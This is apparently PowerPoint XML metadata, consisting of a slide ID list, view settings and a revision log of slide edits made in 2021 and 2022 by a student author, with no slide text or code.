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67"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="264" r:id="rId3"/>
    <p:sldId id="265" r:id="rId4"/>
    <p:sldId id="266" r:id="rId5"/>
    <p:sldId id="267" r:id="rId6"/>
    <p:sldId id="288" r:id="rId7"/>
    <p:sldId id="289" r:id="rId8"/>
    <p:sldId id="290" r:id="rId9"/>
    <p:sldId id="268" r:id="rId10"/>
    <p:sldId id="269" r:id="rId11"/>
    <p:sldId id="270" r:id="rId12"/>
    <p:sldId id="271" r:id="rId13"/>
    <p:sldId id="286" r:id="rId14"/>
    <p:sldId id="287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2" r:id="rId25"/>
    <p:sldId id="281" r:id="rId26"/>
    <p:sldId id="283" r:id="rId27"/>
    <p:sldId id="297" r:id="rId28"/>
    <p:sldId id="284" r:id="rId29"/>
    <p:sldId id="285" r:id="rId30"/>
    <p:sldId id="315" r:id="rId31"/>
    <p:sldId id="321" r:id="rId32"/>
    <p:sldId id="299" r:id="rId33"/>
    <p:sldId id="300" r:id="rId34"/>
    <p:sldId id="301" r:id="rId35"/>
    <p:sldId id="302" r:id="rId36"/>
    <p:sldId id="303" r:id="rId37"/>
    <p:sldId id="316" r:id="rId38"/>
    <p:sldId id="317" r:id="rId39"/>
    <p:sldId id="318" r:id="rId40"/>
    <p:sldId id="319" r:id="rId41"/>
    <p:sldId id="320" r:id="rId42"/>
    <p:sldId id="304" r:id="rId43"/>
    <p:sldId id="306" r:id="rId44"/>
    <p:sldId id="309" r:id="rId45"/>
    <p:sldId id="310" r:id="rId46"/>
    <p:sldId id="313" r:id="rId47"/>
    <p:sldId id="314" r:id="rId48"/>
    <p:sldId id="312" r:id="rId49"/>
    <p:sldId id="324" r:id="rId50"/>
    <p:sldId id="325" r:id="rId51"/>
    <p:sldId id="326" r:id="rId52"/>
    <p:sldId id="327" r:id="rId53"/>
    <p:sldId id="328" r:id="rId54"/>
    <p:sldId id="329" r:id="rId55"/>
    <p:sldId id="330" r:id="rId56"/>
    <p:sldId id="331" r:id="rId57"/>
    <p:sldId id="332" r:id="rId58"/>
    <p:sldId id="333" r:id="rId59"/>
    <p:sldId id="334" r:id="rId60"/>
    <p:sldId id="335" r:id="rId61"/>
    <p:sldId id="360" r:id="rId62"/>
    <p:sldId id="361" r:id="rId63"/>
    <p:sldId id="362" r:id="rId64"/>
    <p:sldId id="322" r:id="rId65"/>
    <p:sldId id="363" r:id="rId6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E45426C3-A483-4981-B83C-45B903EB53EB}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="264"/>
            <p14:sldId id="265"/>
            <p14:sldId id="266"/>
            <p14:sldId id="267"/>
            <p14:sldId id="288"/>
            <p14:sldId id="289"/>
            <p14:sldId id="290"/>
            <p14:sldId id="268"/>
            <p14:sldId id="269"/>
            <p14:sldId id="270"/>
            <p14:sldId id="271"/>
            <p14:sldId id="286"/>
            <p14:sldId id="287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2"/>
            <p14:sldId id="281"/>
            <p14:sldId id="283"/>
            <p14:sldId id="297"/>
            <p14:sldId id="284"/>
            <p14:sldId id="285"/>
            <p14:sldId id="315"/>
            <p14:sldId id="321"/>
            <p14:sldId id="299"/>
            <p14:sldId id="300"/>
            <p14:sldId id="301"/>
            <p14:sldId id="302"/>
            <p14:sldId id="303"/>
            <p14:sldId id="316"/>
            <p14:sldId id="317"/>
            <p14:sldId id="318"/>
            <p14:sldId id="319"/>
            <p14:sldId id="320"/>
            <p14:sldId id="304"/>
            <p14:sldId id="306"/>
            <p14:sldId id="309"/>
            <p14:sldId id="310"/>
            <p14:sldId id="313"/>
            <p14:sldId id="314"/>
            <p14:sldId id="312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  <p14:sldId id="334"/>
            <p14:sldId id="335"/>
            <p14:sldId id="360"/>
            <p14:sldId id="361"/>
            <p14:sldId id="362"/>
            <p14:sldId id="322"/>
            <p14:sldId id="3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76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" v="9" dt="2022-11-04T05:34:59.7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941" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="143" d="100"/>
          <a:sy n="143" d="100"/>
        </p:scale>
        <p:origin x="-104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86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효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}"/>
    <pc:docChg chg="custSel modSld modMainMaster">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T05:34:57.989" v="9" actId="20578"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T05:32:30.344" v="8" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2439970183" sldId="330"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T05:32:30.344" v="8" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2439970183" sldId="330"/>
            <ac:spMk id="3" creationId="{727BC1CE-6767-45C5-88A8-735CC9B12781}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T05:34:57.989" v="9" actId="20578"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3261163106" sldId="334"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T05:34:57.989" v="9" actId="20578"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3261163106" sldId="334"/>
            <ac:spMk id="3" creationId="{1837102F-3499-4418-BDCA-A09680E224B3}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldMasterChg chg="delSp modSldLayout">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:16.016" v="7" actId="478"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
        </pc:sldMasterMkLst>
        <pc:picChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:00.173" v="0" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <ac:picMk id="1026" creationId="{1EF39420-1696-4E54-87DF-79AD7DE80951}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:02.639" v="2" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:02.639" v="2" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="546768808" sldId="2147483673"/>
              <ac:picMk id="11" creationId="{DAA0D7A3-6928-4C01-A482-7794986FF1A5}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:05.059" v="3" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:05.059" v="3" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="67324703" sldId="2147483675"/>
              <ac:picMk id="14" creationId="{3B7FE58E-2497-4D0D-A840-8D897A307375}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:07.305" v="4" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:07.305" v="4" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2157310852" sldId="2147483679"/>
              <ac:picMk id="10" creationId="{98451C86-C339-4FF7-8A13-0B63E9B4F7AF}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:10.618" v="5" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:10.618" v="5" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
              <ac:picMk id="11" creationId="{1699C7EA-96C9-421E-9F3C-C664E83A957D}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:13.259" v="6" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:13.259" v="6" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
              <ac:picMk id="10" creationId="{1A4BE99F-4AE2-4BEA-8D48-B1BF3C8FDFFB}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:16.016" v="7" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C76EE740-2A4B-7F4D-9DDC-9BBFACE98D01}" dt="2022-11-04T02:05:16.016" v="7" actId="478"/>
            <ac:picMkLst>
              <pc:docMk/>
              <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
              <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
              <ac:picMk id="10" creationId="{717264EC-A67D-40EC-9C6B-5D0A30610B31}"/>
            </ac:picMkLst>
          </pc:picChg>
        </pc:sldLayoutChg>
      </pc:sldMasterChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld sldOrd modMainMaster modSection modShowInfo">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:53:10.512" v="1156"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:22:37.128" v="126" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4271878798" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:22:10.466" v="119" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4271878798" sldId="256"/>
            <ac:spMk id="2" creationId="{3D9CB0BF-81E0-42EC-91C8-E32C844400CF}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:22:37.128" v="126" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4271878798" sldId="256"/>
            <ac:spMk id="3" creationId="{22379862-334E-462A-BC01-BB5250028995}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:22:24.521" v="120" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2597479544" sldId="257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268441739" sldId="258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233997469" sldId="259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905191823" sldId="260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288033808" sldId="261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814052635" sldId="262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098045552" sldId="263"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:24:54.496" v="498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C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:24:54.496" v="498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41368066" sldId="265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318163772" sldId="265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684101697" sldId="266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388057446" sldId="266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1045402370" sldId="267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2398488887" sldId="267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132550847" sldId="268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17464433" sldId="268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81593077" sldId="269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597539278" sldId="269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213161158" sldId="270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848337476" sldId="270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21:22.134" v="414" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2956657893" sldId="271"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:21:22.134" v="414" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2956657893" sldId="271"/>
            <ac:spMk id="2" creationId="{510F4660-100E-4073-97C5-F80F50198544}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:01:58.373" v="277" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2956657893" sldId="271"/>
            <ac:picMk id="9" creationId="{8177479F-A63A-4DC3-9597-4B92C60D97EB}"/>
          </ac:picMkLst>
        </pc:picChg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92945585" sldId="272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563383341" sldId="272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3105420141" sldId="27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011726360" sldId="27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562858279" sldId="27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2:13.846" v="279" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2337990836" sldId="27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2:13.485" v="278" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3113574588" sldId="27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195893911" sldId="27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28.001" v="158"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="711119976" sldId="27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31.437" v="159"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3650578037" sldId="27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35.586" v="160"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1731767942" sldId="27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3:55:53.420" v="161"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="428576480" sldId="27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505018846" sldId="28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71646766" sldId="28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46235029" sldId="28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738717978" sldId="28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108929877" sldId="28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98235405" sldId="28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985595965" sldId="28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108145237" sldId="28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879821062" sldId="28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993003946" sldId="28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24154356" sldId="29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272398856" sldId="29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406602799" sldId="29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66278660" sldId="29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060878423" sldId="29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175899499" sldId="29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996816349" sldId="29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045765425" sldId="297"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:54:21.747" v="154" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2557303942" sldId="29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040518841" sldId="29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193450419" sldId="30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082602585" sldId="301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03:26.484" v="291" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3044177403" sldId="302"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:03:26.484" v="291" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3044177403" sldId="302"/>
            <ac:spMk id="3" creationId="{13DA64C0-5266-4756-847C-790AC8CA68D5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591863186" sldId="30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735915025" sldId="30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240414345" sldId="30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760324094" sldId="30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37978872" sldId="30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907991251" sldId="30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482123724" sldId="30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3:32.960" v="292" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2424403291" sldId="31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682925829" sldId="31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3564423949" sldId="31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28712980" sldId="31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150555230" sldId="31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840296087" sldId="31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607939077" sldId="316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7T14:02:54.752" v="280" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2416698218" sldId="317"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:02:54.752" v="280" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2416698218" sldId="317"/>
            <ac:spMk id="3" creationId="{0FACA2A7-FA49-4095-9072-93FD8A69BF12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137838211" sldId="318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1114188019" sldId="319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2617413653" sldId="320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00:41.550" v="275"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="78947117" sldId="321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29.034" v="334"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2679956423" sldId="322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3247097004" sldId="323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1579073654" sldId="324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2650239397" sldId="325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1:14.808" v="333"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3039382090" sldId="326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0:38.993" v="330"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="168451364" sldId="327"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:10:25.009" v="329"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="601295334" sldId="328"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:27:13.565" v="1064"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4141664827" sldId="329"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:27:13.565" v="1064"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4141664827" sldId="329"/>
            <ac:spMk id="3" creationId="{BC27760A-2346-463B-BBBD-90E3FB271BD7}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:08:18.548" v="327"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1902405254" sldId="330"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:08:18.548" v="327"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1902405254" sldId="330"/>
            <ac:spMk id="5" creationId="{40BF1B47-0E15-4AE6-B644-D5526DD8B158}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T13:54:16.976" v="153"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1283875618" sldId="33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4059579555" sldId="33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4:22.181" v="335"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3879814390" sldId="332"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:30:55.209" v="1066" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3417646756" sldId="333"/>
        </pc:sldMkLst>
        <pc:picChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-08T11:30:55.209" v="1066" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3417646756" sldId="333"/>
            <ac:picMk id="6" creationId="{5EC27DAD-0ABB-42B9-8BB7-7D980C37CB39}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="add ord">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:17:48.722" v="338"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1509551197" sldId="334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2396147998" sldId="33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4065314893" sldId="336"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:20:32.384" v="394" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1994696824" sldId="337"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{C51637DA-6AE0-49DB-8846-B0B68BB6DB08}" dt="2021-11-07T14:20:32.384" v="394" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1994696824" sldId="337"/>
            <ac:spMk id="7" creationId="{6489A443-664F-4050-9643-CF6F254630F4}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
